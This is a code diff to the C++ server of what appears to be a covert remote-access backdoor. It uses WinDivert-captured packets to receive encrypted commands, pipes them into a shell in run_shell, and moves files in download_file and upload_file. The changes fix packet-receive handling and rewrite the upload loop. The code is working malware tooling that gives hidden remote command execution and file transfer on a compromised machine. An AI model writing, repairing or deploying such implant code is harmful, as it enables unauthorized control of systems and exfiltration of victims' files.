@@ -46,7 +46,8 @@ void CServer::start()
 
 	while (TRUE)
 	{
-		recv_data_packet(packet, &payload_len, &payload_buf);
+		if (!recv_data_packet(packet, &payload_len, &payload_buf))
+			continue;
 
 		if (payload_len && payload_buf)
 		{
@@ -214,7 +215,8 @@ void CServer::run_shell()
 
 	while (true)
 	{
-		recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf);
+		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
+			continue;
 		if (payload_len && payload_buf)
 		{
 			if (strstr(payload_buf, "download"))
@@ -229,7 +231,7 @@ void CServer::run_shell()
 			}
 			DWORD real_write = 0;
 			strcpy(last_cmd, payload_buf);
-			if (!WriteFile(m_std_in_wr, payload_buf, payload_len, &real_write, NULL))
+			if (!WriteFile(m_std_in_wr, payload_buf, strlen(payload_buf), &real_write, NULL))
 			{
 				cout << "[!] write data:"<< payload_buf << " error!" << endl;
 			}
@@ -401,11 +403,13 @@ bool CServer::recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID *paylo
 	{
 		send_response_packet(packet_buf, recv_len);
 		decrypt_payload(*payload_buf, *payload_len);
-		*payload_len = strlen((char*)*payload_buf);
 		cout << "[*] recv payload length: " << *payload_len << " bytes" << endl;
-		cout << "[*] recv payload buffer: " << (char*)*payload_buf << endl;
+		return true;
 	}
-	return true;
+	else
+	{
+		return false;
+	}
 }
 
 void CServer::wait_for_connect()
@@ -482,7 +486,6 @@ void CServer::download_file(string download_str)
 		
 		send_data_packet(file_buf.get(), real_read + 4);
 		cout << "[*] send file data " << real_read << " bytes finish" << endl;
-		wait_for_recv();
 		if (want_read > real_read)
 		{
 			cout << "[*] download file " << src_file << " to " << dst_file << " finish" << endl;
@@ -509,46 +512,29 @@ void CServer::upload_file(string upload_str)
 	str_stream >> dst_file;
 
 	cout << "[*] upload file" << src_file << "to" << dst_file << endl;
-	auto fp = fopen(dst_file.c_str(), "wb");
-	if (!fp)
+	ofstream fout = ofstream(dst_file, ios::binary);
+	if (!fout.is_open())
 	{
 		cout << "[!] failed to open file buffer (" << GetLastError() << ")!" << endl;
 		return;
 	}
 	send_data_packet("upload_start");
+	int i = 0;
 	while (true)
 	{
-		recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf);
-		if (!strcmp(payload_buf, "upload_finish"))
+		i++;
+		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
+			continue;
+		if (payload_len== 16 && !strcmp(payload_buf, "upload_finish"))
 		{
 			cout << "[*] finish upload" << endl;
-			fclose(fp);
+			fout.close();
 			return;
 		}
+
 		size_t len = *(size_t*)payload_buf;
 		cout << "[*] recv file data " << len << " bytes" << endl;
-		fwrite(payload_buf + 4, len, 1, fp);
+		fout.write(payload_buf + 4, len);
 		send_data_packet("recv_ok");
-	}
-}
-
-void CServer::wait_for_recv()
-{
-	UINT payload_len;
-	PVOID payload_buf;
-
-	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
-
-	while (TRUE)
-	{
-		recv_data_packet(packet.get(), &payload_len, &payload_buf);
-		if (payload_len && payload_buf)
-		{
-			if (payload_len >= strlen("recv_ok") && !memcmp(payload_buf, "recv_ok", strlen("recv_ok")))
-			{
-				cout << "[*] recv ok" << endl;
-				return;
-			}
-		}
 	}
 }
